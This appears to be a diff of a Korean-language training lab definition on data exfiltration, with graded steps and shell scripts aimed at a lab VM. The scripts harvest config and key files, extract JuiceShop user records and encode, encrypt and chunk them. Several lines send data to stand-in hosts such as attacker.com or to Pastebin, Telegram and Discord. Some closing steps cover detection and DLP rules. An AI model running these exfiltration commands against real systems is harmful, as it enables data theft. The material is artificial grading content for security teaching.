@@ -29,20 +29,21 @@ steps:
     expect: /
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 민감 파일 식별(T1005 Collection) — find /etc /home /var/www -type f -name .conf/.env/.key/.pem/.sql
+        로 고가치 파일 열거
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh + find /etc /home /var/www \( -name .conf -o .env -o .key -o .pem -o .sql \) 실행
+      - 출력에 실제 파일 경로 최소 2개
+      - Collection 전술 MITRE ATT&CK T1005 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - find + -name + 복합 조건
+      - grep -rE (password|api_key) /etc
+      - LinPEAS sensitive files 섹션
+      - ripgrep rg pattern
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 단일 확장자만 검색
+      - 결과에서 고가치 파일 식별 없음
+      - T1005 언급 없음
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf" -o -name "*.env" -o
     -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null | head -20' 2>/dev/null
@@ -64,20 +65,20 @@ steps:
     expect: Extracted users
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: JuiceShop /api/Users SQLi 로 사용자 데이터 추출 후 CSV 파일(/tmp/exfil_users.csv) 저장 — 청크 유출 준비
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl + python3 으로 id,email 컬럼만 추출
+      - /tmp/exfil_users.csv 파일 저장 + wc -l 로 라인 수
+      - 'Extracted users: 라벨 + head 출력'
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl | python3 json parse | redirect > file
+      - curl | jq -r .data[] | \(.id),\(.email)
+      - sqlmap --dump-all 로 대량 추출
+      - python requests + pandas to_csv
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 파일 저장 없음
+      - 전체 JSON 저장 (필터 없음)
+      - 라인 수 확인 없음
   target_vm: attacker
   script: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; users=json.load(sys.stdin)['data'];
     [print(f\"{u['id']},{u['email']}\") for u in users]" > /tmp/exfil_users.csv && echo 'Extracted users:'
@@ -101,20 +102,20 @@ steps:
     expect: Original size
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 추출 데이터 Base64 인코딩 — 바이너리→텍스트 변환으로 HTTP/DNS 텍스트 채널 호환, DLP 패턴 매칭 회피
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - base64 <file> > encoded.txt 실행
+      - 원본 vs 인코딩 크기(+33%) 비교 출력
+      - DLP 회피·텍스트 채널 호환 맥락 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - base64 <file>
+      - openssl base64 -in <file>
+      - python3 base64.b64encode(open(f).read())
+      - xxd -p (hex 대안)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 원본 크기만 측정
+      - Preview 없음
+      - DLP 회피 의도 언급 없음
   target_vm: attacker
   script: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:' && wc -c /tmp/exfil_users.csv
     && echo 'Encoded size:' && wc -c /tmp/exfil_encoded.txt && echo 'Preview:' && head -3 /tmp/exfil_encoded.txt
@@ -138,20 +139,21 @@ steps:
     expect: HTTP Exfiltration
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: HTTP POST 데이터 유출 시뮬 — curl -X POST -d @<encoded> + JSON 위장(Content-Type application/json,
+        log 필드) 로 탐지 회피
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - curl -X POST -d @<file> http://attacker 명령 제시
+      - JSON 위장 + Content-Type application/json 변형 추가
+      - 탐지 방법(proxy logs·DLP·POST size) 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -X POST -d @<file>
+      - curl -X POST -H Content-Type:application/json -d {...}
+      - python requests.post
+      - 실제 pastebin/cloud-storage 경유 예시
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - GET 으로 대체 (body 없음)
+      - 정상 JSON 위장 없음
+      - 탐지 방법 언급 없음
   target_vm: attacker
   script: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X POST -d @/tmp/exfil_encoded.txt
     http://attacker.com/collect'' && echo ''---'' && echo ''With headers disguise:'' && echo ''curl -X
@@ -177,20 +179,21 @@ steps:
     expect: DNS Tunneling
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: DNS 터널링 원리 시연 — 데이터를 hex/base32 로 인코딩해 DNS 서브도메인(ENCODED.exfil.attacker.com)에 실어 전송, iodine/dnscat2
+        언급
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - xxd -p 로 데이터 hex 인코딩 후 DNS 쿼리 형식 제시
+      - dig <hex>.exfil.attacker.com 예시
+      - 실제 도구(iodine/dnscat2/DNSExfiltrator) 최소 2개 + 탐지 방법(긴 도메인·높은 volume)
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -n data | xxd -p + DNS 쿼리 구성
+      - base32 인코딩 대안
+      - iodine/dnscat2 설정 예시
+      - python dnslib 으로 커스텀 터널
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 인코딩 없이 raw 데이터
+      - 실제 도구 언급 없음
+      - 탐지 방법 누락
   target_vm: attacker
   script: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''=== DNS Tunneling Simulation
     ==='' && echo "Original: $DATA" && echo "Encoded: $ENCODED" && echo "DNS query: dig $ENCODED.exfil.attacker.com"
@@ -216,20 +219,20 @@ steps:
     expect: ICMP Tunneling
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: ICMP 터널링 — ping -p <hex> 로 Echo payload 에 커스텀 데이터 삽입, 방화벽의 TCP/UDP 차단 시 ICMP 허용을 악용
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - echo -n <data> | xxd -p 로 hex 인코딩 후 ping -c 1 -p <hex>
+      - Data hex 출력 + ICMP 패킷 전송 결과
+      - icmpsh/ptunnel/icmptunnel 도구 언급 + 탐지(ICMP 크기·빈도)
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ping -c 1 -p <hex> <IP>
+      - hping3 --icmp --data <payload>
+      - scapy IP/ICMP/Raw(load=...)
+      - icmptunnel or ptunnel 직접 설정
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - ping 기본 실행 (-p 없이)
+      - payload 인코딩 없음
+      - 탐지 방법 누락
   target_vm: attacker
   script: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in ICMP payload:'' &&
     DATA_HEX=$(echo -n ''EXFIL'' | xxd -p) && echo "Data hex: $DATA_HEX" && ping -c 1 -p $DATA_HEX 10.20.30.80
@@ -255,20 +258,20 @@ steps:
     expect: Encrypted file
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: openssl AES-256-CBC 대칭 암호화 — pbkdf2 키 유도로 유출 데이터 암호화, DLP 콘텐츠 검사 완전 회피
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:<key> 실행
+      - 암호화된 파일 file/ls -la 확인
+      - 복호화 명령(openssl enc -d) 예시 제시 + 네트워크 행위 기반 탐지 의존 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - openssl enc -aes-256-cbc -pbkdf2
+      - gpg --symmetric --cipher-algo AES256
+      - openssl enc -aes-256-gcm (AEAD)
+      - python cryptography Fernet
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - pbkdf2 없이 구식 EVP_BytesToKey
+      - 복호화 명령 없음
+      - 콘텐츠 검사 회피 맥락 누락
   target_vm: attacker
   script: 'openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin -pass
     pass:exfil_key_2026 -pbkdf2 2>/dev/null && echo ''Encrypted file:'' && file /tmp/exfil_encrypted.bin
@@ -293,20 +296,20 @@ steps:
     expect: Chunks created
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Low-and-Slow 유출 — split -b 로 소량 청크 분할 + 시간 분산 전송 시뮬레이션 (DLP 볼륨 기반 탐지 회피)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - split -b 50 <file> <prefix> 로 청크 파일 생성
+      - ls -la 로 청크 목록과 각 크기 확인
+      - for 루프 + date 로 시간차 전송 시뮬
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - split -b <size> <file>
+      - dd if=<file> of=chunk_N bs=<size> count=1 skip=N
+      - python 으로 청크 순차 전송 with sleep
+      - 업무 시간대만 전송 스케줄
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 단일 전송 (분할 없음)
+      - 시간 분산 없음
+      - DLP 볼륨 탐지 맥락 언급 없음
   target_vm: attacker
   script: split -b 50 /tmp/exfil_users.csv /tmp/chunk_ && echo 'Chunks created:' && ls -la /tmp/chunk_*
     && echo '---' && echo 'Low-and-slow exfil simulation:' && for f in /tmp/chunk_*; do echo "Sending
@@ -333,20 +336,20 @@ steps:
     expect: Steganography simulation
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 스테가노그래피 시뮬 — cat 으로 이미지 파일 끝에 SECRET_DATA 텍스트 append, 파일 외형은 정상이나 tail 로 추출 가능
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 이미지 파일(또는 dd 로 가짜 jpg) + secret 파일 cat 결합
+      - 원본·스테고 파일 크기 비교 출력
+      - steghide/openstego/snow/binwalk 실제 도구 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - cat <img> <secret> > <stego>
+      - steghide embed -cf <img> -ef <secret>
+      - echo -e 로 binary append
+      - LSB 인코딩 python PIL
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 텍스트 파일에 다른 텍스트 추가 (이미지 아님)
+      - 원본-스테고 크기 비교 없음
+      - binwalk 탐지 도구 언급 없음
   target_vm: attacker
   script: 'echo ''SECRET_DATA:admin@juice-sh.op:password123'' > /tmp/secret.txt && dd if=/dev/urandom
     bs=1024 count=10 of=/tmp/fake_image.jpg 2>/dev/null && cat /tmp/fake_image.jpg /tmp/secret.txt > /tmp/stego_image.jpg
@@ -375,20 +378,20 @@ steps:
     expect: Cloud Service Exfiltration
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 클라우드 서비스(Pastebin/Telegram/Discord) 경유 유출 — HTTPS 암호화로 콘텐츠 검사 회피, 정상 도메인 위장
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Pastebin/Telegram/Discord 중 2개 이상 API 호출 명령 예시
+      - 각 서비스별 curl -X POST/-F 구성
+      - SSL inspection·도메인 reputation 탐지 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - curl -X POST pastebin.com/api/api_post.php
+      - curl -F document=@<file> api.telegram.org/bot<token>/sendDocument
+      - curl -F file=@<file> discord.com/api/webhooks/<id>
+      - gdrive/rclone 으로 Google Drive 업로드
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 단일 서비스만
+      - API 구조 잘못 (token/chat_id 누락)
+      - SSL inspection 언급 없음
   target_vm: attacker
   script: 'echo ''=== Cloud Service Exfiltration ==='' && echo ''Pastebin: curl -X POST -d "api_paste_code=$(cat
     /tmp/exfil_encoded.txt)" https://pastebin.com/api/api_post.php'' && echo ''Telegram: curl -F "document=@/tmp/exfil_encrypted.bin"
@@ -415,20 +418,20 @@ steps:
     expect: Archive created
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: tar czf 아카이브 + gzip 압축 — 전송 볼륨 최소화, 텍스트 데이터 90%+ 압축 후 암호화 결합 가능
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - tar czf <output> <inputs> 실행
+      - ls -lh 로 압축 파일 크기 + du -ch 로 원본 크기 비교
+      - Archive created 메시지 + 압축률 확인
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - tar czf /tmp/exfil_archive.tar.gz <files>
+      - zip -9 -e <archive> <files> (암호 보호)
+      - tar cz <files> | openssl enc (파이프로 암호화)
+      - 7z a -mhe <archive> <files>
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 압축 없이 단순 tar (tar cf)
+      - 크기 비교 없음
+      - 암호화 결합 가능성 언급 없음
   target_vm: attacker
   script: tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt 2>/dev/null &&
     echo 'Archive created:' && ls -lh /tmp/exfil_archive.tar.gz && echo 'Original total:' && du -ch /tmp/exfil_users.csv
@@ -454,20 +457,20 @@ steps:
     expect: Exfiltration Detection
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: tcpdump 로 유출 트래픽 탐지 — DNS 길이 이상(>200)·HTTP POST·ICMP 크기 이상(>100) 패턴별 필터
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - DNS/HTTP/ICMP 3 유형 각각 tcpdump 필터 + awk length 조건식
+      - 실제 tcpdump 실행 샘플 (port 53 등)
+      - IDS/IPS + SIEM 상관 분석 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - tcpdump -i any port 53 -l | awk length>200
+      - tshark -Y dns.qry.name 기반 필터
+      - Suricata dns.query 규칙
+      - Zeek dns.log 분석
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 필터 1 유형만
+      - tcpdump 실행 없이 개념만
+      - SIEM 연계 언급 없음
   target_vm: attacker
   script: echo '=== Exfiltration Detection ===' && echo 'DNS tunneling detection:' && echo 'tcpdump -i
     any port 53 -nn -l | awk "{if(length>200) print \"SUSPICIOUS:\", \$0}"' && echo '---' && echo 'HTTP
@@ -493,20 +496,20 @@ steps:
     expect: Hex encoded
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Wazuh 에서 데이터 유출 탐지 룰 예시 — /etc/passwd/shadow 접근, 대용량 파일 출력, 암호화 도구 실행, 비정상 아웃바운드 연결
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Wazuh 룰 XML 또는 Sigma 룰 형식의 탐지 조건 제시
+      - 최소 4개 탐지 시나리오(파일 접근/aws 호출/openssl/아웃바운드)
+      - 실제 룰 번호(SID) 또는 MITRE 매핑 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - <rule id=100001 level=10>...</rule> XML
+      - Sigma YAML
+      - Suricata/Snort 룰
+      - Splunk SPL 쿼리
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 룰 형식 없이 자연어만
+      - 시나리오 2개 이하
+      - MITRE 매핑 없음
   target_vm: attacker
   script: echo 'admin:password123' | xxd -p > /tmp/hex_exfil.txt && echo 'Hex encoded:' && cat /tmp/hex_exfil.txt
     && echo 'Decoded:' && xxd -r -p /tmp/hex_exfil.txt && echo '---' && echo 'Hex encoding is useful for
@@ -533,20 +536,20 @@ steps:
     expect: DLP Firewall Rules
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: DLP(Data Loss Prevention) 솔루션 기본 정책 설계 — 신용카드/SSN/PII 정규식 + 키워드 + 분류 기반 + 암호화 파일 탐지
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Credit Card Luhn/SSN/이메일/의료번호 등 4개 이상 PII 패턴
+      - 정규식 또는 Bloom filter 언급
+      - SSL 인터셉션·엔드포인트 에이전트 필요성 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - 정규식 기반 패턴 매칭
+      - Microsoft Purview 정책
+      - Symantec DLP 룰
+      - OpenDLP / MyDLP 설정
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 패턴 2개 이하
+      - 정규식 표현 없이 개념만
+      - 암호화 파일 처리 언급 없음
   target_vm: attacker
   script: 'echo -e ''=== DLP Firewall Rules (nftables) ===\n\n# Rate limit outbound connections\nadd rule
     inet filter output tcp dport {80, 443} ct state new limit rate 10/minute burst 20 accept\nadd rule
@@ -578,20 +581,21 @@ steps:
     expect: Data Exfiltration Report
     field: stdout
     semantic:
-      intent: 데이터 유출 (Data Exfiltration) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 데이터 유출 리포트 — 유출 경로(HTTP/DNS/ICMP/Cloud)·기법(암호화/스테가노/LowAndSlow)·MITRE T1048/T1071/T1041
+        매핑 + 방어 권고(DLP/EDR/SSL inspection)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - '[Channels Used] [Techniques] [MITRE Mapping] [Recommendations] 4 섹션'
+      - 유출 채널 최소 4개 + T-ID 최소 3개
+      - 파일 저장 후 cat 확인
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo -e > /tmp/exfil_report.txt
+      - heredoc markdown
+      - python jinja2 템플릿
+      - DREAD/STRIDE 위험 평가 포함
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(데이터 유출 (Data Exfiltration))와 무관한 기법
+      - 섹션 2 미만
+      - T-ID 매핑 없음
+      - 파일 저장 없음
   target_vm: attacker
   script: 'echo -e ''=== Data Exfiltration Report ===\n\n[Data Collected]\n- User credentials from JuiceShop
     API\n- Configuration files from web server\n\n[Exfiltration Channels]\n1. HTTP POST: Easy, blends
